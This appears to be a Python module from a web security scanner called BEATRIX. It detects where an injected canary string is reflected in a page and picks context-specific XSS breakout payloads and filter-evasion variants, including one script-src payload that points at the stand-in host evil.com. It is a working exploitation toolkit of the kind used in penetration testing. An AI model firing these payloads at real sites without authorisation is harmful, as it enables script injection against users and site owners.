"""
BEATRIX Reflection Context Analyzer
====================================

Determines WHERE user input is reflected in an HTTP response, then selects
context-appropriate XSS breakout payloads.

Contexts detected:
- HTML_BODY           — between tags: <div>REFLECTION</div>
- HTML_ATTR_DQ        — inside double-quoted attribute: value="REFLECTION"
- HTML_ATTR_SQ        — inside single-quoted attribute: value='REFLECTION'
- HTML_ATTR_UQ        — unquoted attribute value: value=REFLECTION
- HTML_ATTR_NAME      — attribute name context: <div REFLECTION="x">
- HTML_TAG_NAME       — tag name context: <REFLECTION>
- HTML_COMMENT        — inside HTML comment: <!-- REFLECTION -->
- JS_STRING_DQ        — JS double-quoted string: var x = "REFLECTION"
- JS_STRING_SQ        — JS single-quoted string: var x = 'REFLECTION'
- JS_STRING_TMPL      — JS template literal: var x = `REFLECTION`
- JS_BLOCK            — JS code block (assignment, etc.): var x = REFLECTION
- CSS_VALUE           — CSS property value: color: REFLECTION
- CSS_URL             — CSS url(): url(REFLECTION)
- SCRIPT_SRC          — <script src="REFLECTION">
- HREF                — <a href="REFLECTION">
- IFRAME_SRCDOC       — <iframe srcdoc="REFLECTION">
- TEXTAREA            — <textarea>REFLECTION</textarea>
- TITLE               — <title>REFLECTION</title>
- NOSCRIPT            — <noscript>REFLECTION</noscript>
- FORM_ACTION         — <form action="REFLECTION">
- JSON_VALUE          — JSON response: {"key": "REFLECTION"}
- HEAD                — inside <head> element

This module is response-format-agnostic — it works on raw HTML/JS/CSS text.
"""

import re
from dataclasses import dataclass, field
from enum import Enum, auto
from typing import Dict, List, Optional, Tuple


class ReflectionContext(Enum):
    """Where in the response the input is reflected."""
    HTML_BODY = auto()
    HTML_ATTR_DQ = auto()       # double-quoted attribute value
    HTML_ATTR_SQ = auto()       # single-quoted attribute value
    HTML_ATTR_UQ = auto()       # unquoted attribute value
    HTML_ATTR_NAME = auto()     # attribute name
    HTML_TAG_NAME = auto()      # tag name
    HTML_COMMENT = auto()       # inside <!-- -->
    JS_STRING_DQ = auto()       # "..." in <script> or .js
    JS_STRING_SQ = auto()       # '...' in <script> or .js
    JS_STRING_TMPL = auto()     # `...` template literal
    JS_BLOCK = auto()           # bare JS expression / assignment
    CSS_VALUE = auto()          # CSS property value
    CSS_URL = auto()            # CSS url(...)
    SCRIPT_SRC = auto()         # <script src="...">
    HREF = auto()               # href="..." (a, link, area, base)
    IFRAME_SRCDOC = auto()      # srcdoc="..."
    TEXTAREA = auto()           # <textarea>...</textarea>
    TITLE = auto()              # <title>...</title>
    NOSCRIPT = auto()           # <noscript>...</noscript>
    FORM_ACTION = auto()        # <form action="...">
    JSON_VALUE = auto()         # JSON string value
    HEAD = auto()               # inside <head> but not a more specific ctx


@dataclass
class ReflectionPoint:
    """One occurrence of input reflected in the response."""
    context: ReflectionContext
    position: int                # char offset in response body
    surrounding: str             # ~120 chars around the reflection for evidence
    chars_escaped: List[str] = field(default_factory=list)   # which chars were entity-encoded


# ── Canary ───────────────────────────────────────────────────────────────────
# This 12-char canary is injected to discover reflections.  It has no HTML/JS
# special chars so it won't be escaped or blocked.
CANARY = "bXr9kQ4wZ7mL"


# ── Context-specific XSS payloads ────────────────────────────────────────────

@dataclass
class ContextPayload:
    """A context-aware XSS payload."""
    value: str
    name: str
    context: ReflectionContext
    # regex patterns that confirm the payload executed/reflected unescaped
    confirm_patterns: List[str] = field(default_factory=list)


def payloads_for_context(ctx: ReflectionContext, escaped_chars: Optional[List[str]] = None) -> List[ContextPayload]:
    """Return XSS payloads tuned for the given reflection context.

    If *escaped_chars* is given, payloads that rely on those characters are
    deprioritized (but still included as fallbacks in case encoding is
    inconsistent).
    """
    escaped = set(escaped_chars or [])

    _ALL: Dict[ReflectionContext, List[ContextPayload]] = {
        # ── HTML body ────────────────────────────────────────────
        ReflectionContext.HTML_BODY: [
            ContextPayload("<script>alert(1)</script>", "body_script_tag", ReflectionContext.HTML_BODY,
                           [r"<script>alert\(1\)</script>"]),
            ContextPayload("<img src=x onerror=alert(1)>", "body_img_onerror", ReflectionContext.HTML_BODY,
                           [r"<img src=x onerror=alert\(1\)>"]),
            ContextPayload("<svg onload=alert(1)>", "body_svg_onload", ReflectionContext.HTML_BODY,
                           [r"<svg onload=alert\(1\)>"]),
            ContextPayload("<details open ontoggle=alert(1)>", "body_details_ontoggle", ReflectionContext.HTML_BODY,
                           [r"<details open ontoggle=alert\(1\)>"]),
            ContextPayload("<body onload=alert(1)>", "body_onload", ReflectionContext.HTML_BODY,
                           [r"<body onload=alert\(1\)>"]),
            ContextPayload("<marquee onstart=alert(1)>", "body_marquee", ReflectionContext.HTML_BODY,
                           [r"<marquee onstart=alert\(1\)>"]),
        ],

        # ── Double-quoted attribute ──────────────────────────────
        ReflectionContext.HTML_ATTR_DQ: [
            ContextPayload('" onfocus=alert(1) autofocus="', "attr_dq_onfocus", ReflectionContext.HTML_ATTR_DQ,
                           [r'onfocus=alert\(1\)']),
            ContextPayload('" onmouseover=alert(1) x="', "attr_dq_onmouseover", ReflectionContext.HTML_ATTR_DQ,
                           [r'onmouseover=alert\(1\)']),
            ContextPayload('"><script>alert(1)</script>', "attr_dq_break_script", ReflectionContext.HTML_ATTR_DQ,
                           [r'<script>alert\(1\)</script>']),
            ContextPayload('"><img src=x onerror=alert(1)>', "attr_dq_break_img", ReflectionContext.HTML_ATTR_DQ,
                           [r'<img src=x onerror=alert\(1\)>']),
            ContextPayload('" style=animation-name:x onanimationstart=alert(1) x="', "attr_dq_animation",
                           ReflectionContext.HTML_ATTR_DQ, [r'onanimationstart=alert\(1\)']),
        ],

        # ── Single-quoted attribute ──────────────────────────────
        ReflectionContext.HTML_ATTR_SQ: [
            ContextPayload("' onfocus=alert(1) autofocus='", "attr_sq_onfocus", ReflectionContext.HTML_ATTR_SQ,
                           [r'onfocus=alert\(1\)']),
            ContextPayload("' onmouseover=alert(1) x='", "attr_sq_onmouseover", ReflectionContext.HTML_ATTR_SQ,
                           [r'onmouseover=alert\(1\)']),
            ContextPayload("'><script>alert(1)</script>", "attr_sq_break_script", ReflectionContext.HTML_ATTR_SQ,
                           [r'<script>alert\(1\)</script>']),
            ContextPayload("'><img src=x onerror=alert(1)>", "attr_sq_break_img", ReflectionContext.HTML_ATTR_SQ,
                           [r'<img src=x onerror=alert\(1\)>']),
        ],

        # ── Unquoted attribute ───────────────────────────────────
        ReflectionContext.HTML_ATTR_UQ: [
            ContextPayload(" onfocus=alert(1) autofocus ", "attr_uq_onfocus", ReflectionContext.HTML_ATTR_UQ,
                           [r'onfocus=alert\(1\)']),
            ContextPayload(" onmouseover=alert(1) ", "attr_uq_onmouseover", ReflectionContext.HTML_ATTR_UQ,
                           [r'onmouseover=alert\(1\)']),
            ContextPayload("><img src=x onerror=alert(1)>", "attr_uq_break_img", ReflectionContext.HTML_ATTR_UQ,
                           [r'<img src=x onerror=alert\(1\)>']),
        ],

        # ── Attribute name ───────────────────────────────────────
        ReflectionContext.HTML_ATTR_NAME: [
            ContextPayload("onfocus=alert(1) autofocus x", "attrname_onfocus", ReflectionContext.HTML_ATTR_NAME,
                           [r'onfocus=alert\(1\)']),
            ContextPayload("onmouseover=alert(1) x", "attrname_onmouseover", ReflectionContext.HTML_ATTR_NAME,
                           [r'onmouseover=alert\(1\)']),
        ],

        # ── Tag name ─────────────────────────────────────────────
        ReflectionContext.HTML_TAG_NAME: [
            ContextPayload("img src=x onerror=alert(1)", "tagname_img", ReflectionContext.HTML_TAG_NAME,
                           [r'<img src=x onerror=alert\(1\)']),
            ContextPayload("svg onload=alert(1)", "tagname_svg", ReflectionContext.HTML_TAG_NAME,
                           [r'<svg onload=alert\(1\)']),
        ],

        # ── HTML comment ─────────────────────────────────────────
        ReflectionContext.HTML_COMMENT: [
            ContextPayload("--><script>alert(1)</script><!--", "comment_break", ReflectionContext.HTML_COMMENT,
                           [r'<script>alert\(1\)</script>']),
            ContextPayload("--><img src=x onerror=alert(1)><!--", "comment_break_img", ReflectionContext.HTML_COMMENT,
                           [r'<img src=x onerror=alert\(1\)>']),
        ],

        # ── JS double-quoted string ──────────────────────────────
        ReflectionContext.JS_STRING_DQ: [
            ContextPayload('";alert(1)//', "js_dq_break_alert", ReflectionContext.JS_STRING_DQ,
                           [r'";alert\(1\)//']),
            ContextPayload('"-alert(1)-"', "js_dq_minus", ReflectionContext.JS_STRING_DQ,
                           [r'"-alert\(1\)-"']),
            ContextPayload('";</script><script>alert(1)</script>', "js_dq_script_break",
                           ReflectionContext.JS_STRING_DQ, [r'<script>alert\(1\)</script>']),
            ContextPayload('\\";alert(1)//', "js_dq_backslash_break", ReflectionContext.JS_STRING_DQ,
                           [r'\\";alert\(1\)//']),
        ],

        # ── JS single-quoted string ──────────────────────────────
        ReflectionContext.JS_STRING_SQ: [
            ContextPayload("';alert(1)//", "js_sq_break_alert", ReflectionContext.JS_STRING_SQ,
                           [r"';alert\(1\)//"]),
            ContextPayload("'-alert(1)-'", "js_sq_minus", ReflectionContext.JS_STRING_SQ,
                           [r"'-alert\(1\)-'"]),
            ContextPayload("';</script><script>alert(1)</script>", "js_sq_script_break",
                           ReflectionContext.JS_STRING_SQ, [r"<script>alert\(1\)</script>"]),
            ContextPayload("\\';</script><script>alert(1)</script>", "js_sq_backslash_script",
                           ReflectionContext.JS_STRING_SQ, [r"<script>alert\(1\)</script>"]),
        ],

        # ── JS template literal ──────────────────────────────────
        ReflectionContext.JS_STRING_TMPL: [
            ContextPayload("${alert(1)}", "js_tmpl_interpolation", ReflectionContext.JS_STRING_TMPL,
                           [r"\$\{alert\(1\)\}"]),
            ContextPayload("`;alert(1)//", "js_tmpl_break_alert", ReflectionContext.JS_STRING_TMPL,
                           [r"`;alert\(1\)//"]),
        ],

        # ── JS bare expression / assignment ──────────────────────
        ReflectionContext.JS_BLOCK: [
            ContextPayload(";alert(1)//", "js_block_semicolon", ReflectionContext.JS_BLOCK,
                           [r";alert\(1\)//"]),
            ContextPayload("-alert(1)-", "js_block_minus", ReflectionContext.JS_BLOCK,
                           [r"-alert\(1\)-"]),
            ContextPayload("</script><script>alert(1)</script>", "js_block_script_break",
                           ReflectionContext.JS_BLOCK, [r"<script>alert\(1\)</script>"]),
        ],

        # ── CSS value ────────────────────────────────────────────
        ReflectionContext.CSS_VALUE: [
            ContextPayload("red;}</style><script>alert(1)</script>", "css_style_break",
                           ReflectionContext.CSS_VALUE, [r"<script>alert\(1\)</script>"]),
            ContextPayload("expression(alert(1))", "css_expression", ReflectionContext.CSS_VALUE,
                           [r"expression\(alert\(1\)\)"]),
            ContextPayload("url(javascript:alert(1))", "css_url_js", ReflectionContext.CSS_VALUE,
                           [r"javascript:alert\(1\)"]),
        ],

        # ── CSS url() ────────────────────────────────────────────
        ReflectionContext.CSS_URL: [
            ContextPayload("javascript:alert(1)", "css_url_javascript", ReflectionContext.CSS_URL,
                           [r"javascript:alert\(1\)"]),
            ContextPayload(");}</style><script>alert(1)</script>", "css_url_break",
                           ReflectionContext.CSS_URL, [r"<script>alert\(1\)</script>"]),
        ],

        # ── href attribute ───────────────────────────────────────
        ReflectionContext.HREF: [
            ContextPayload("javascript:alert(1)", "href_javascript", ReflectionContext.HREF,
                           [r"javascript:alert\(1\)"]),
            ContextPayload("data:text/html,<script>alert(1)</script>", "href_data_uri", ReflectionContext.HREF,
                           [r"data:text/html"]),
        ],

        # ── script src ───────────────────────────────────────────
        ReflectionContext.SCRIPT_SRC: [
            ContextPayload("https://evil.com/xss.js", "scriptsrc_external", ReflectionContext.SCRIPT_SRC,
                           [r"https://evil\.com/xss\.js"]),
            ContextPayload("data:text/javascript,alert(1)", "scriptsrc_data", ReflectionContext.SCRIPT_SRC,
                           [r"data:text/javascript,alert\(1\)"]),
        ],

        # ── iframe srcdoc ────────────────────────────────────────
        ReflectionContext.IFRAME_SRCDOC: [
            ContextPayload('<script>alert(1)</script>', "srcdoc_script", ReflectionContext.IFRAME_SRCDOC,
                           [r"<script>alert\(1\)</script>"]),
            ContextPayload('&lt;script&gt;alert(1)&lt;/script&gt;', "srcdoc_encoded", ReflectionContext.IFRAME_SRCDOC,
                           [r"&lt;script&gt;alert\(1\)&lt;/script&gt;"]),
        ],

        # ── textarea ─────────────────────────────────────────────
        ReflectionContext.TEXTAREA: [
            ContextPayload("</textarea><script>alert(1)</script>", "textarea_break", ReflectionContext.TEXTAREA,
                           [r"<script>alert\(1\)</script>"]),
            ContextPayload("</textarea><img src=x onerror=alert(1)>", "textarea_break_img", ReflectionContext.TEXTAREA,
                           [r"<img src=x onerror=alert\(1\)>"]),
        ],

        # ── title ────────────────────────────────────────────────
        ReflectionContext.TITLE: [
            ContextPayload("</title><script>alert(1)</script>", "title_break", ReflectionContext.TITLE,
                           [r"<script>alert\(1\)</script>"]),
            ContextPayload("</title><img src=x onerror=alert(1)>", "title_break_img", ReflectionContext.TITLE,
                           [r"<img src=x onerror=alert\(1\)>"]),
        ],

        # ── noscript ─────────────────────────────────────────────
        ReflectionContext.NOSCRIPT: [
            ContextPayload("</noscript><script>alert(1)</script>", "noscript_break", ReflectionContext.NOSCRIPT,
                           [r"<script>alert\(1\)</script>"]),
        ],

        # ── form action ──────────────────────────────────────────
        ReflectionContext.FORM_ACTION: [
            ContextPayload("javascript:alert(1)", "form_action_js", ReflectionContext.FORM_ACTION,
                           [r"javascript:alert\(1\)"]),
        ],

        # ── JSON value ───────────────────────────────────────────
        ReflectionContext.JSON_VALUE: [
            ContextPayload('</script><script>alert(1)</script>', "json_script_break", ReflectionContext.JSON_VALUE,
                           [r"<script>alert\(1\)</script>"]),
        ],

        # ── head ─────────────────────────────────────────────────
        ReflectionContext.HEAD: [
            ContextPayload("</head><body><img src=x onerror=alert(1)>", "head_break", ReflectionContext.HEAD,
                           [r"<img src=x onerror=alert\(1\)>"]),
            ContextPayload('<base href="javascript://">', "head_base", ReflectionContext.HEAD,
                           [r'<base href="javascript://">']),
        ],
    }

    result = list(_ALL.get(ctx, []))

    # Deprioritize payloads that depend on escaped characters
    if escaped:
        def _depends_on_escaped(p: ContextPayload) -> bool:
            for ch in escaped:
                if ch in p.value:
                    return True
            return False

        primary = [p for p in result if not _depends_on_escaped(p)]
        fallback = [p for p in result if _depends_on_escaped(p)]
        result = primary + fallback

    return result


# ── Filter evasion payloads ──────────────────────────────────────────────────

def evasion_payloads_for_context(ctx: ReflectionContext, blocked_strings: Optional[List[str]] = None) -> List[ContextPayload]:
    """Generate evasion-oriented payloads when standard payloads are filtered.

    These use case variations, encoding tricks, alternative tags, and
    obfuscation to bypass server-side filters.
    """
    payloads: List[ContextPayload] = []

    if ctx in (ReflectionContext.HTML_BODY, ReflectionContext.HTML_ATTR_DQ,
               ReflectionContext.HTML_ATTR_SQ, ReflectionContext.HTML_ATTR_UQ,
               ReflectionContext.TEXTAREA, ReflectionContext.TITLE,
               ReflectionContext.NOSCRIPT, ReflectionContext.HTML_COMMENT):
        payloads.extend([
            # Case variation
            ContextPayload("<ScRiPt>alert(1)</sCrIpT>", "evasion_case_script", ctx,
                           [r"(?i)<script>alert\(1\)</script>"]),
            # Alternative event handlers
            ContextPayload("<svg/onload=alert(1)>", "evasion_svg_slash", ctx,
                           [r"<svg/onload=alert\(1\)>"]),
            ContextPayload("<body onpageshow=alert(1)>", "evasion_onpageshow", ctx,
                           [r"onpageshow=alert\(1\)"]),
            ContextPayload("<input onfocus=alert(1) autofocus>", "evasion_input_autofocus", ctx,
                           [r"onfocus=alert\(1\)"]),
            ContextPayload("<video><source onerror=alert(1)>", "evasion_video_source", ctx,
                           [r"onerror=alert\(1\)"]),
            ContextPayload("<math><mtext><table><mglyph><svg><mtext><textarea><path id=x><animate attributeName=d values=alert(1) /><set attributeName=onclick to=eval(name)>", 
                           "evasion_math_chain", ctx, [r"alert\(1\)"]),
            # Encoding tricks
            ContextPayload("<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>",
                           "evasion_html_entity_onerror", ctx, [r"onerror="]),
            # Tab/newline insertion
            ContextPayload("<img\tsrc=x\tonerror=alert(1)>", "evasion_tab_img", ctx,
                           [r"onerror=alert\(1\)"]),
            ContextPayload("<img\nsrc=x\nonerror=alert(1)>", "evasion_newline_img", ctx,
                           [r"onerror=alert\(1\)"]),
            # Double encoding (if server double-decodes)
            ContextPayload("%253Cscript%253Ealert(1)%253C/script%253E", "evasion_double_encode", ctx,
                           [r"<script>alert\(1\)</script>"]),
            # Null byte
            ContextPayload("<scr\x00ipt>alert(1)</scr\x00ipt>", "evasion_null_byte", ctx,
                           [r"alert\(1\)"]),
        ])

    if ctx in (ReflectionContext.JS_STRING_DQ, ReflectionContext.JS_STRING_SQ,
               ReflectionContext.JS_BLOCK):
        payloads.extend([
            ContextPayload("\\u0061lert(1)", "evasion_js_unicode_escape", ctx,
                           [r"alert\(1\)"]),
            ContextPayload("eval(atob('YWxlcnQoMSk='))", "evasion_js_atob", ctx,
                           [r"eval\(atob"]),
            ContextPayload("window['alert'](1)", "evasion_js_bracket_notation", ctx,
                           [r"window\['alert'\]\(1\)"]),
            ContextPayload("[].constructor.constructor('alert(1)')()", "evasion_js_constructor", ctx,
                           [r"constructor"]),
        ])

    return payloads


# ═════════════════════════════════════════════════════════════════════════════
# CORE: find_reflection_contexts
# ═════════════════════════════════════════════════════════════════════════════

def find_reflection_contexts(
    response_body: str,
    canary: str = CANARY,
) -> List[ReflectionPoint]:
    """
    Find all locations where *canary* appears in *response_body* and
    classify the surrounding context.

    Call this AFTER sending a request with the canary string as the parameter
    value.  Returns a list of ReflectionPoints describing where and how the
    input is reflected.
    """
    if canary not in response_body:
        return []

    points: List[ReflectionPoint] = []
    body_lower = response_body.lower()
    canary_lower = canary.lower()

    # Find all occurrences
    start = 0
    while True:
        idx = body_lower.find(canary_lower, start)
        if idx == -1:
            break

        ctx = _classify_context(response_body, idx, canary)
        surrounding = response_body[max(0, idx - 60): idx + len(canary) + 60]
        escaped = _detect_escaped_chars(response_body, idx, canary)

        points.append(ReflectionPoint(
            context=ctx,
            position=idx,
            surrounding=surrounding,
            chars_escaped=escaped,
        ))
        start = idx + len(canary)

    return points


def detect_char_escaping(
    response_body: str,
    canary: str,
    probe_response: str,
    probe_value: str,
) -> List[str]:
    """
    After sending a probe with special chars (e.g. canary + <>"'`),
    detect which chars were escaped/encoded in the response.
    """
    escaped = []
    test_chars = {
        "<": ["&lt;", "\\u003c", "\\x3c", "%3c", "&#60;", "&#x3c;"],
        ">": ["&gt;", "\\u003e", "\\x3e", "%3e", "&#62;", "&#x3e;"],
        '"': ["&quot;", "\\u0022", "\\x22", "%22", "&#34;", "\\\""],
        "'": ["&#039;", "\\u0027", "\\x27", "%27", "&#39;", "\\'", "&apos;"],
        "`": ["\\u0060", "\\x60", "%60", "&#96;"],
        "(": ["\\u0028", "\\x28", "%28", "&#40;"],
        ")": ["\\u0029", "\\x29", "%29", "&#41;"],
        "/": ["\\u002f", "\\x2f", "%2f", "&#47;"],
    }

    for char, encoded_forms in test_chars.items():
        if char in probe_value and char not in probe_response:
            # Char was removed or encoded
            if any(enc.lower() in probe_response.lower() for enc in encoded_forms):
                escaped.append(char)
            elif char not in probe_response:
                escaped.append(char)  # Removed entirely

    return escaped


# ═════════════════════════════════════════════════════════════════════════════
# INTERNAL: context classification
# ═════════════════════════════════════════════════════════════════════════════

def _classify_context(body: str, pos: int, canary: str) -> ReflectionContext:
    """Determine the rendering context at *pos* in *body*."""

    # Look at the text before the reflection to determine context
    prefix = body[:pos]
    suffix = body[pos + len(canary):]

    # ── Check if inside a <script> block ─────────────────────────
    last_script_open = prefix.rfind("<script")
    last_script_close = prefix.rfind("</script")
    if last_script_open > last_script_close:
        # We're inside a <script> block — determine JS sub-context
        return _classify_js_context(prefix, suffix, last_script_open)

    # ── Check if inside a <style> block ──────────────────────────
    last_style_open = prefix.rfind("<style")
    last_style_close = prefix.rfind("</style")
    if last_style_open > last_style_close:
        return _classify_css_context(prefix, suffix)

    # ── Check if inside an HTML tag ──────────────────────────────
    last_tag_open = prefix.rfind("<")
    last_tag_close = prefix.rfind(">")
    if last_tag_open > last_tag_close:
        # Inside an HTML tag — could be attr value, attr name, or tag name
        return _classify_tag_context(prefix, suffix, last_tag_open, canary)

    # ── Check if inside HTML comment ─────────────────────────────
    last_comment_open = prefix.rfind("<!--")
    last_comment_close = prefix.rfind("-->")
    if last_comment_open > last_comment_close:
        return ReflectionContext.HTML_COMMENT

    # ── Check if inside special elements ─────────────────────────
    for tag, ctx in [
        ("textarea", ReflectionContext.TEXTAREA),
        ("title", ReflectionContext.TITLE),
        ("noscript", ReflectionContext.NOSCRIPT),
    ]:
        tag_open = prefix.lower().rfind(f"<{tag}")
        tag_close = prefix.lower().rfind(f"</{tag}")
        if tag_open > tag_close:
            return ctx

    # ── Check if inside <head> ───────────────────────────────────
    head_open = prefix.lower().rfind("<head")
    head_close = prefix.lower().rfind("</head")
    if head_open > head_close:
        return ReflectionContext.HEAD

    # ── Check if JSON response ───────────────────────────────────
    stripped = body.lstrip()
    if stripped.startswith("{") or stripped.startswith("["):
        # Look for JSON-style quoting around the canary
        pre_chars = prefix[-5:] if len(prefix) >= 5 else prefix
        if '"' in pre_chars or "'" in pre_chars:
            return ReflectionContext.JSON_VALUE

    # Default: HTML body context
    return ReflectionContext.HTML_BODY


def _classify_js_context(prefix: str, suffix: str, script_tag_pos: int) -> ReflectionContext:
    """Classify sub-context within a <script> block."""
    # Get the JS-specific prefix (text after the <script...> opening tag)
    tag_end = prefix.find(">", script_tag_pos)
    if tag_end == -1:
        return ReflectionContext.JS_BLOCK
    js_prefix = prefix[tag_end + 1:]

    # Check if inside a string literal
    # Walk backwards counting unescaped quotes
    in_dq = _is_inside_string(js_prefix, '"')
    in_sq = _is_inside_string(js_prefix, "'")
    in_tmpl = _is_inside_string(js_prefix, '`')

    if in_dq:
        return ReflectionContext.JS_STRING_DQ
    if in_sq:
        return ReflectionContext.JS_STRING_SQ
    if in_tmpl:
        return ReflectionContext.JS_STRING_TMPL

    # Check for JS comment context
    last_line_comment = js_prefix.rfind("//")
    last_newline = js_prefix.rfind("\n")
    if last_line_comment > last_newline:
        return ReflectionContext.JS_BLOCK  # inside // comment, but treat as block

    last_block_comment = js_prefix.rfind("/*")
    last_block_close = js_prefix.rfind("*/")
    if last_block_comment > last_block_close:
        return ReflectionContext.JS_BLOCK  # inside /* */ comment

    return ReflectionContext.JS_BLOCK


def _classify_css_context(prefix: str, suffix: str) -> ReflectionContext:
    """Classify sub-context within a <style> block."""
    # Check if inside url()
    last_url_open = prefix.rfind("url(")
    last_url_close = prefix.rfind(")")
    if last_url_open > last_url_close:
        return ReflectionContext.CSS_URL

    return ReflectionContext.CSS_VALUE


def _classify_tag_context(prefix: str, suffix: str, tag_start: int, canary: str) -> ReflectionContext:
    """Classify context within an HTML tag."""
    tag_content = prefix[tag_start + 1:]  # everything after '<'

    # Extract tag name
    tag_name_match = re.match(r'(\w+)', tag_content)
    if not tag_name_match:
        return ReflectionContext.HTML_TAG_NAME

    tag_name = tag_name_match.group(1).lower()

    # Check if the canary IS the tag name
    if tag_content.strip().lower().startswith(canary.lower()):
        return ReflectionContext.HTML_TAG_NAME

    # Get the part after the tag name (the attributes area)
    attr_area = tag_content[len(tag_name):]

    # Check specific attribute contexts
    # Look for src= in script tags
    if tag_name == "script":
        if re.search(r'src\s*=\s*["\']?[^"\']*$', attr_area, re.IGNORECASE):
            return ReflectionContext.SCRIPT_SRC

    # href in link/a/area/base tags
    if tag_name in ("a", "link", "area", "base"):
        if re.search(r'href\s*=\s*["\']?[^"\']*$', attr_area, re.IGNORECASE):
            return ReflectionContext.HREF

    # form action
    if tag_name == "form":
        if re.search(r'action\s*=\s*["\']?[^"\']*$', attr_area, re.IGNORECASE):
            return ReflectionContext.FORM_ACTION

    # iframe srcdoc
    if tag_name == "iframe":
        if re.search(r'srcdoc\s*=\s*["\']?[^"\']*$', attr_area, re.IGNORECASE):
            return ReflectionContext.IFRAME_SRCDOC

    # Check if inside an attribute value (look for last unmatched = with quote)
    # Pattern: attr="...CANARY or attr='...CANARY or attr=CANARY
    # Walk backwards from the end of attr_area
    last_eq = attr_area.rfind("=")
    if last_eq >= 0:
        after_eq = attr_area[last_eq + 1:].lstrip()
        if after_eq.startswith('"'):
            # Inside double-quoted attribute value
            # Check if there's a closing " before the end
            remaining = after_eq[1:]
            if '"' not in remaining:
                return ReflectionContext.HTML_ATTR_DQ
        elif after_eq.startswith("'"):
            remaining = after_eq[1:]
            if "'" not in remaining:
                return ReflectionContext.HTML_ATTR_SQ
        else:
            # Unquoted attribute value, or attribute name
            if after_eq:
                return ReflectionContext.HTML_ATTR_UQ

    # Check if this looks like an attribute name position
    # If the canary appears right before = in suffix, it's an attr name
    suffix_stripped = suffix.lstrip()
    if suffix_stripped.startswith("=") or suffix_stripped.startswith(" "):
        return ReflectionContext.HTML_ATTR_NAME

    return ReflectionContext.HTML_ATTR_UQ  # Default if inside tag


def _is_inside_string(text: str, quote_char: str) -> bool:
    """Check if the end of *text* is inside an unescaped string literal."""
    count = 0
    i = 0
    while i < len(text):
        ch = text[i]
        if ch == '\\':
            i += 2  # skip escaped char
            continue
        if ch == quote_char:
            count += 1
        i += 1
    # Odd count means we're inside a string
    return count % 2 == 1


def _detect_escaped_chars(body: str, pos: int, canary: str) -> List[str]:
    """Detect which special chars were HTML-encoded near the reflection point.

    This is a quick check based on entity presence near the canary.
    More thorough checking uses detect_char_escaping with a probe payload.
    """
    # This is mainly useful when the canary itself contains special chars
    # (which our default canary does not).  Kept for the probe-based flow.
    return []
